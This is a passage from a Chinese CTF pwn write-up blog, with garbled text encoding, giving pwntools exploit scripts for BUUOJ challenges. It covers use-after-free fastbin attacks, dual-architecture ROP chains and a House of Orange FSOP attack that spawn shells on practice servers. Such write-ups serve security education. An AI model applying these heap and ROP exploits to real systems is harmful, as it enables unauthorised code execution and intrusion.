class="string">&quot;|%&quot;</span> + <span class="built_in">str</span>(<span class="number">0x85AB</span>) + <span class="string">&quot;c%18$hnarttnba3&quot;</span>)</span><br><span class="line">        p.recvuntil(<span class="string">b&quot;arttnba3&quot;</span>)</span><br><span class="line">        p.sendline(<span class="string">b&quot;cat flag&quot;</span>)</span><br><span class="line">        p.recvline_contains(<span class="string">&#x27;flag&#x27;</span>, timeout=<span class="number">1</span>)</span><br><span class="line">        p.interactive()</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        p.close()</span><br><span class="line">    count += <span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¾— flagï¼ˆè¿æ°”è¿˜æŒºå¥½ï¼‰</p>
<p><img src="https://i.loli.net/2021/08/25/GfLUreJWTvsyuji.png" alt="image.png"></p>
<h2 id="0x072-wustctf2020-easyfast-Use-After-Free-Fastbin-Attack"><a href="#0x072-wustctf2020-easyfast-Use-After-Free-Fastbin-Attack" class="headerlink" title="0x072.wustctf2020_easyfast - Use After Free + Fastbin Attack"></a>0x072.wustctf2020_easyfast - Use After Free + Fastbin Attack</h2><p>æƒ¯ä¾‹çš„ <code>checksec</code> ï¼Œåªå¼€äº† NX å’Œ canary</p>
<p><img src="https://i.loli.net/2021/08/25/cKoaG1XHxhZvUV8.png" alt="image.png"></p>
<p>æ‹–å…¥ IDA è¿›è¡Œåˆ†æï¼Œå¸¸è§„çš„èœå•å †</p>
<p><img src="https://i.loli.net/2021/08/25/gJY7h9oVlcZi1Ok.png" alt="image.png"></p>
<p>æœ‰ä¸ªè£¸çš„ UAF</p>
<p><img src="https://i.loli.net/2021/08/25/BOmfjRE4UkLsGTQ.png" alt="image.png"></p>
<p>æœ‰ä¸ªåé—¨</p>
<p><img src="https://i.loli.net/2021/08/25/KCUyR8DIcS42wdJ.png" alt="image.png"></p>
<p>è¿™ä¸ªä½ç½®åˆšå¥½æœ‰ä¸€ä¸ª 0x50 çš„ header</p>
<p><img src="https://i.loli.net/2021/08/25/uLsN82WZQP7dDhb.png" alt="image.png"></p>
<p>æ•… exp å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p_name = <span class="string">&#x27;./wustctf2020_easyfast&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27337</span>)<span class="comment">#process(p_name)#</span></span><br><span class="line">e = ELF(p_name)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/arttnba3/Desktop/CTF/libc/64bit/libc-2.23.so&#x27;</span>)<span class="comment">#ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">command:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;choice&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(command).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;size&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;index&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;index&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    new(<span class="number">0x40</span>)</span><br><span class="line">    new(<span class="number">0x40</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    edit(<span class="number">1</span>, p64(<span class="number">0x602080</span>))</span><br><span class="line">    new(<span class="number">0x40</span>)</span><br><span class="line">    new(<span class="number">0x40</span>)</span><br><span class="line">    edit(<span class="number">3</span>, p64(<span class="number">0</span>))</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯ get shell</p>
<p><img src="https://i.loli.net/2021/08/25/XutRe9gfc5HMNjb.png" alt="image.png"></p>
<h2 id="0x073-å¼ºç½‘æ¯2019-æ‹Ÿæ€-STKOF-ret2text"><a href="#0x073-å¼ºç½‘æ¯2019-æ‹Ÿæ€-STKOF-ret2text" class="headerlink" title="0x073.å¼ºç½‘æ¯2019 æ‹Ÿæ€ STKOF - ret2text"></a>0x073.å¼ºç½‘æ¯2019 æ‹Ÿæ€ STKOF - ret2text</h2><p>ç»™äº†ä¸¤ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå¾—ä¸€ä¸ª exp åŒæ—¶æ‰“é€šä¸¤ä¸ªæ‰è¡Œ</p>
<p>æƒ¯ä¾‹çš„ <code>checksec</code>ï¼Œåªå¼€äº† NX å’Œ canary</p>
<p><img src="https://i.loli.net/2021/08/25/wT3lY5pIHXaQmuk.png" alt="image.png"></p>
<p>æ‹–å…¥ IDA è¿›è¡Œåˆ†æ</p>
<p>éƒ½æ˜¯æ ˆæº¢å‡ºï¼Œä½†æ˜¯åˆ° bp å¯„å­˜å™¨çš„è·ç¦»ä¸åŒï¼Œå¯ä»¥åˆ©ç”¨è¿™ä¸ªå·®è·å¸ƒç½®æ°å½“çš„ payload</p>
<p><img src="https://i.loli.net/2021/08/25/vW9T6FA1J7SIBXV.png" alt="image.png"></p>
<p><img src="https://i.loli.net/2021/08/25/buUMfcPQ5Eiepol.png" alt="image.png"></p>
<p>é™æ€ç¼–è¯‘çš„ç¨‹åºæœ‰å¾ˆå¤šå¯ç”¨çš„ gadgetï¼Œå¯¹äº 32 ä½è€Œè¨€ï¼Œå¯ä»¥å¯»æ‰¾ä¸€ä¸ªåˆé€‚çš„ <code>sub esp</code> æˆ–è€… <code>add esp</code> çš„ gadget å°† payload ä¸ 64 ä½é”™å¼€ï¼Œ64ä½æ­£å¸¸å¸ƒç½® payload å³å¯</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ROPgadget --binary ./pwn --ropchain | grep <span class="string">&#x27;add esp&#x27;</span></span></span><br><span class="line">...</span><br><span class="line">0x08092c75 : add esp, 0x70 ; pop ebx ; pop esi ; pop edi ; ret</span><br></pre></td></tr></table></figure>

<p>exp å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#context.arch = &#x27;amd64&#x27;</span></span><br><span class="line">e1 = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">e2 = ELF(<span class="string">&#x27;./pwn2&#x27;</span>)</span><br><span class="line">pop_rdi_ret = <span class="number">0x4005f6</span></span><br><span class="line">pop_rsi_ret = <span class="number">0x405895</span></span><br><span class="line">pop_rdx_ret = <span class="number">0x43b9d5</span></span><br><span class="line">pop_rax_ret = <span class="number">0x43b97c</span></span><br><span class="line">pop_rdx_pop_rsi_ret = <span class="number">0x43d9f9</span></span><br><span class="line">pop_ebx_pop_esi_pop_edi_ret = <span class="number">0x08049b19</span></span><br><span class="line">pop_edx_pop_ecx_pop_ebx_ret = <span class="number">0x0806e9f1</span></span><br><span class="line">pop_eax_ret = <span class="number">0x080a8af6</span></span><br><span class="line">syscall = <span class="number">0x4011dc</span></span><br><span class="line">int_0x80 = <span class="number">0x080495a3</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x10C</span> + p32(<span class="number">0xdeadbeef</span>) + p32(<span class="number">0x08092c75</span>) + p32(<span class="number">0xdeadbeef</span>) </span><br><span class="line">payload64 = p64(pop_rdi_ret) + p64(<span class="number">0</span>) + p64(pop_rsi_ret) + p64(e2.sym[<span class="string">&#x27;__free_hook&#x27;</span>]) + p64(e2.sym[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">payload64 += p64(pop_rdi_ret) + p64(e2.sym[<span class="string">&#x27;__free_hook&#x27;</span>]) + p64(pop_rdx_pop_rsi_ret) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(pop_rax_ret) + p64(<span class="number">59</span>) + p64(syscall)</span><br><span class="line">payload64 = payload64.ljust(<span class="number">0x70</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">payload32 = <span class="string">b&#x27;arttnba3&#x27;</span> + p32(e1.sym[<span class="string">&#x27;read&#x27;</span>]) + p32(pop_ebx_pop_esi_pop_edi_ret) + p32(<span class="number">0</span>) + p32(e1.sym[<span class="string">&#x27;__free_hook&#x27;</span>]) + p32(<span class="number">0x100</span>)</span><br><span class="line">payload32 += p32(pop_eax_ret) + p32(<span class="number">11</span>) + p32(pop_edx_pop_ecx_pop_ebx_ret) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(e1.sym[<span class="string">&#x27;__free_hook&#x27;</span>]) + p32(int_0x80)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29732</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendline(payload + payload64 + payload32)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯ get shellï¼ˆå±…ç„¶æ˜¯ rootï¼‰</p>
<p><img src="https://i.loli.net/2021/08/25/aMUpTQZsOLrEci4.png" alt="image.png"></p>
<h2 id="0x074-hitcon-2018-children-tcache-off-by-null"><a href="#0x074-hitcon-2018-children-tcache-off-by-null" class="headerlink" title="0x074.hitcon_2018_children_tcache - off by null"></a>0x074.hitcon_2018_children_tcache - off by null</h2><h2 id="0x075-roarctf-2019-realloc-magic"><a href="#0x075-roarctf-2019-realloc-magic" class="headerlink" title="0x075.roarctf_2019_realloc_magic"></a>0x075.roarctf_2019_realloc_magic</h2><h1 id="0x-0x"><a href="#0x-0x" class="headerlink" title="0x??? ~ 0x???"></a>0x??? ~ 0x???</h1><h2 id="0x-houseoforange-hitcon-2016-House-of-Orange"><a href="#0x-houseoforange-hitcon-2016-House-of-Orange" class="headerlink" title="0x???.houseoforange_hitcon_2016 - House of Orange"></a>0x???.houseoforange_hitcon_2016 - House of Orange</h2><p>æƒ³éƒ½ä¸ç”¨æƒ³è‚¯å®šäº‹ä¿æŠ¤å…¨å¼€</p>
<p><img src="https://i.loli.net/2021/05/10/aQHisnOz1tXlCMY.png" alt="image.png"></p>
<p>æ‹–å…¥ IDA è¿›è¡Œåˆ†æï¼Œå¤§æ¦‚æœ‰ç€åˆ†é…ã€æ‰“å°ã€ç¼–è¾‘å †å—çš„åŠŸèƒ½ï¼Œ<strong>æ²¡æœ‰é‡Šæ”¾çš„åŠŸèƒ½</strong></p>
<p>åªèƒ½åˆ†é…ä¸‰æ¬¡</p>
<p><img src="https://i.loli.net/2021/05/10/6KJBQ7vXUPLcF3C.png" alt="image.png"></p>
<p>æ¼æ´ç‚¹åœ¨äºç¼–è¾‘å †å—çš„æ—¶å€™éªŒè¯ä¸ä¸¥å¯†ï¼Œå­˜åœ¨å †æº¢å‡º</p>
<p><img src="https://i.loli.net/2021/05/10/1YseHJxnPOZQc4K.png" alt="image.png"></p>
<p>ç”±äºæ²¡æœ‰ free() å‡½æ•°ï¼Œè€ƒè™‘é€šè¿‡å †æº¢å‡ºä¿®æ”¹ top chunk çš„ size åå†è¡Œåˆ†é…è§¦å‘ brk ç³»ç»Ÿè°ƒç”¨æ‰©å±•å †åŒºå°†åŸæœ‰ top chunk é€å…¥ unsorted bin åå†åˆ†é…å›æ¥ï¼Œé€šè¿‡ bk æŒ‡é’ˆæ³„éœ² libc åŸºå€</p>
<p>æˆ‘ä»¬éƒ½çŸ¥é“ï¼Œåœ¨åˆ†é…æ—¶è‹¥æ˜¯ small bin å’Œ large bin éƒ½æ˜¯ç©ºçš„æ—¶å€™ï¼Œptmalloc2 ä¼šå°† unsorted bin ä¸­æ‰€æœ‰ chunk æ”¾å…¥ å¯¹åº” bin ä¸­ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡åˆ†é… large bin ä»¥ç”±å…¶ fd_nextsize æŒ‡é’ˆæ³„éœ²å †åŸºå€</p>
<p>éšååœ¨ unsorted bin ä¸­ä¼ªé€  _IO_file_plus ç»“æ„ä½“ï¼Œé€šè¿‡ House of Orange çš„æ‰‹æ³•è¿›è¡Œ FSOP ä»¥ get shell</p>
<p>æ¯”è¾ƒå‘çš„ä¸€ä¸ªç‚¹å¤§æ¦‚æ˜¯æœ¬åœ°å’Œè¿œç¨‹åç§»å¥½åƒæœ‰äº›å°ä¸ä¸€æ ·â€¦â€¦ï¼Ÿåé¢æ‡’å¾—å»ç®—åç§»äº†ç›´æ¥å¤§é¢ç§¯æ’å°±å®Œäº‹äº†</p>
<p>exp å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">p_name = <span class="string">&#x27;./houseoforange_hitcon_2016&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">27323</span>)<span class="comment">#process(p_name)#</span></span><br><span class="line">e = ELF(p_name)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/arttnba3/Desktop/CTF/libc/64bit/libc-2.23.so&#x27;</span>)<span class="comment">#ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">command:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Your choice : &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(command).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size:<span class="built_in">int</span>, content, price:<span class="built_in">int</span>, color:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Length of name :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Name :&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Price of Orange:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(price).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Color of Orange:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(color).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>():</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">size:<span class="built_in">int</span>, content, price:<span class="built_in">int</span>, color:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Length of name :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Name:&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Price of Orange: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(price).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Color of Orange: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(color).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">b&#x27;arttnba3&#x27;</span>, <span class="number">114514</span>, <span class="number">0xddaa</span>)</span><br><span class="line">    edit(<span class="number">0x1000</span>, <span class="string">b&#x27;arttnba3&#x27;</span> * <span class="number">2</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + <span class="string">b&#x27;arttnba3&#x27;</span> * <span class="number">2</span>  + p64(<span class="number">0</span>) + p64(<span class="number">0xfa1</span>), <span class="number">114514</span>, <span class="number">0xddaa</span>)</span><br><span class="line">    new(<span class="number">0x1000</span>, <span class="string">b&#x27;arttnba3&#x27;</span>, <span class="number">114514</span>, <span class="number">0xddaa</span>)</span><br><span class="line">    new(<span class="number">0x400</span>, <span class="string">b&#x27;arttnba3&#x27;</span>, <span class="number">114514</span>, <span class="number">0xddaa</span>)</span><br><span class="line">    dump()</span><br><span class="line">    main_arena = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x668</span></span><br><span class="line">    __malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">    libc_base = __malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    log.success(<span class="string">&#x27;libc base leak: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    edit(<span class="number">0x10</span>, <span class="string">b&#x27;arttnba3&#x27;</span> * <span class="number">2</span>, <span class="number">114514</span>, <span class="number">0xddaa</span>)</span><br><span class="line">    dump()</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;arttnba3&#x27;</span> * <span class="number">2</span>)</span><br><span class="line">    heap_leak = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    heap_base = heap_leak &amp; <span class="number">0xfffffffff000</span></span><br><span class="line">    log.success(<span class="string">&#x27;heap base leak: &#x27;</span> + <span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">    fake_file = <span class="string">b&quot;&quot;</span></span><br><span class="line">    fake_file += <span class="string">b&quot;/bin/sh\x00&quot;</span> <span class="comment"># _flags, an magic number</span></span><br><span class="line">    fake_file += p64(<span class="number">0x61</span>) <span class="comment"># _IO_read_ptr, chunk size, got it into proper small bin</span></span><br><span class="line">    fake_file += p64(<span class="number">0</span>) <span class="comment"># _IO_read_end</span></span><br><span class="line">    fake_file += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>] - <span class="number">0x10</span>)<span class="comment"># _IO_read_base</span></span><br><span class="line">    fake_file += p64(<span class="number">0</span>)<span class="comment"># _IO_write_base</span></span><br><span class="line">    fake_file += p64(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>])<span class="comment"># _IO_write_ptr</span></span><br><span class="line">    fake_file += p64(<span class="number">0</span>)<span class="comment"># _IO_write_end</span></span><br><span class="line">    fake_file += p64(<span class="number">0</span>)<span class="comment"># _IO_buf_base;</span></span><br><span class="line">    fake_file += p64(<span class="number">0</span>) <span class="comment"># _IO_buf_end should usually be (_IO_buf_base + 1)</span></span><br><span class="line">    fake_file += p64(<span class="number">0</span>) * <span class="number">4</span> <span class="comment"># from _IO_save_base to _markers</span></span><br><span class="line">    fake_file += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]) <span class="comment"># the FILE chain ptr</span></span><br><span class="line">    fake_file += p32(<span class="number">2</span>) <span class="comment"># _fileno for stderr is 2</span></span><br><span class="line">    fake_file += p32(<span class="number">0</span>) <span class="comment"># _flags2, usually 0</span></span><br><span class="line">    fake_file += p64(<span class="number">0xFFFFFFFFFFFFFFFF</span>) <span class="comment"># _old_offset, -1</span></span><br><span class="line">    fake_file += p16(<span class="number">0</span>) <span class="comment"># _cur_column</span></span><br><span class="line">    fake_file += <span class="string">b&quot;\x00&quot;</span> <span class="comment"># _vtable_offset</span></span><br><span class="line">    fake_file += <span class="string">b&quot;\n&quot;</span> <span class="comment"># _shortbuf[1]</span></span><br><span class="line">    fake_file += p32(<span class="number">0</span>) <span class="comment"># padding</span></span><br><span class="line">    fake_file += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] + <span class="number">0x1ea0</span>) <span class="comment"># _IO_stdfile_1_lock</span></span><br><span class="line">    fake_file += p64(<span class="number">0xFFFFFFFFFFFFFFFF</span>) <span class="comment"># _offset, -1</span></span><br><span class="line">    fake_file += p64(<span class="number">0</span>) <span class="comment"># _codecvt, usually 0</span></span><br><span class="line">    fake_file += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] - <span class="number">0x160</span>) <span class="comment"># _IO_wide_data_1</span></span><br><span class="line">    fake_file += p64(<span class="number">0</span>) * <span class="number">3</span> <span class="comment"># from _freeres_list to __pad5</span></span><br><span class="line">    fake_file += p32(<span class="number">0xFFFFFFFF</span>) <span class="comment"># _mode, usually -1</span></span><br><span class="line">    fake_file += <span class="string">b&quot;\x00&quot;</span> * <span class="number">19</span> <span class="comment"># _unused2</span></span><br><span class="line">    fake_file = fake_file.ljust(<span class="number">0xD8</span>,<span class="string">b&#x27;\x00&#x27;</span>) <span class="comment"># adjust to vtable</span></span><br><span class="line">    fake_file += p64(heap_base + <span class="number">0x600</span>) <span class="comment"># fake vtable`</span></span><br><span class="line">    fake_file += <span class="number">20</span> * p64(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">0x1000</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x400</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + <span class="string">b&#x27;arttnba3&#x27;</span> * <span class="number">2</span> + fake_file, <span class="number">114514</span>, <span class="number">0xddaa</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯ get shell</p>
<p><img src="https://i.loli.net/2021/05/11/q5paW1fs7Tvl8yg.png" alt="image.png"></p>
<h2 id="0x-lctf2016-pwn200-House-of-Spirit"><a href="#0x-lctf2016-pwn200-House-of-Spirit" class="headerlink" title="0x???.lctf2016_pwn200 - House of Spirit"></a>0x???.lctf2016_pwn200 - House of Spirit</h2><p>æƒ¯ä¾‹çš„ <code>checksec</code>ï¼Œä¿  æŠ¤  å…¨  å…³</p>
<p><img src="https://i.loli.net/2021/05/13/cUdrY5hlZNqDKgw.png" alt="image.png"></p>
<p>æ‹–å…¥ IDA è¿›è¡Œåˆ†æ</p>
<h2 id="0x-ciscn-2019-n-7-exit-hook-hijact-one-gadget-FSOP"><a href="#0x-ciscn-2019-n-7-exit-hook-hijact-one-gadget-FSOP" class="headerlink" title="0x???.ciscn_2019_n_7 -  exit_hook hijact + one_gadget | FSOP"></a>0x???.ciscn_2019_n_7 -  exit_hook hijact + one_gadget | FSOP</h2><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œä¿  æŠ¤  å…¨  å¼€ï¼ˆå™”  å™”  å’š</p>
<p><img src="https://i.loli.net/2021/01/28/eBdwI7PSxn3ypCO.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æï¼Œå¯çŸ¥è¯¥ç¨‹åºæœ‰ç€åˆ†é…ã€ç¼–è¾‘ã€æ‰“å°å †å—çš„åŠŸèƒ½</p>
<p>ä½†æ˜¯æˆ‘ä»¬<strong>ä»…èƒ½å¤Ÿåˆ†é…ä¸€ä¸ªå †å—ï¼Œä¸”æ— æ³•é‡Šæ”¾å †å—</strong></p>
<p><img src="https://i.loli.net/2021/01/28/9aomlHGesxkAqrF.png"></p>
<p>æ¼æ´ç‚¹åœ¨äºåˆ›å»º&#x2F;ç¼–è¾‘å †å—æ—¶è¾“å…¥ä½œè€…å§“åæ—¶<strong>å­˜åœ¨æº¢å‡ºï¼Œå¯ä»¥è¦†å†™æ‰ä¸å…¶ç›¸é‚»çš„å †å—æŒ‡é’ˆ</strong>ï¼Œåœ¨æ¥ä¸‹æ¥çš„ç¼–è¾‘ä¸­æˆ‘ä»¬ä¾¿å¯ä»¥<strong>å®ç°ä»»æ„åœ°å€å†™</strong></p>
<p><img src="https://i.loli.net/2021/01/28/Lq7cFMxUl6ytRiG.png"></p>
<p><img src="https://i.loli.net/2021/01/28/HnhJeRX21OWp5Mq.png"></p>
